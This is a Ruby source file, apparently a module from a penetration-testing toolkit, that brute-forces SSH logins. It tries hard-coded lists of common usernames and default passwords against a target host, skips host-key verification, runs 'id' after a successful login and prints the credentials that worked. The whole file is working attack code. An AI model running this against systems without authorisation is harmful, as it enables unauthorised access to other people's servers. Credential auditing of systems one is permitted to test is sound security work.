#!/usr/bin/env ruby

# Description: Tests SSH service for weak or default credentials

require 'net/ssh'

class SshWeakCredentials
  def initialize
    @timeout = 5
    @common_usernames = ['root', 'admin', 'user', 'test', 'ubuntu', 'centos', 'ec2-user', 'oracle', 'pi']
    @common_passwords = ['', 'password', 'admin', 'root', '123456', 'password123', 'qwerty', 'letmein', 'welcome']
  end
  
  def run(target, port = 22, options = {})
    puts "[*] Testing SSH service on #{target}:#{port} for weak credentials...".blue
    
    verbose = options[:verbose] || false
    successful_auth = false
    credentials = nil
    
    @common_usernames.each do |username|
      break if successful_auth
      
      @common_passwords.each do |password|
        puts "  [*] Trying #{username}:#{password}".blue if verbose
        
        begin
          Net::SSH.start(
            target,
            username,
            password: password,
            port: port,
            non_interactive: true,
            verify_host_key: :never,
            timeout: @timeout,
            auth_methods: ['password']
          ) do |ssh|
            # If we get here, authentication was successful
            successful_auth = true
            credentials = { username: username, password: password }
            
            # Try to execute a simple command to verify access
            output = ssh.exec!("id")
            puts "  [+] Command output: #{output}".green if verbose
          end
          
          if successful_auth
            puts "  [+] Successful authentication with #{username}:#{password}".green
            break
          end
        rescue Net::SSH::AuthenticationFailed
          # Authentication failed
          next
        rescue => e
          puts "  [-] Error: #{e.message}".red if verbose
          next
        end
      end
    end
    
    if successful_auth
      puts "[+] SSH weak credentials found!".green
      puts "  Username: #{credentials[:username]}".green
      puts "  Password: #{credentials[:password]}".green
      
      # Return true to indicate exploit was successful
      true
    else
      puts "[-] No weak SSH credentials found.".red
      false
    end
  end
end
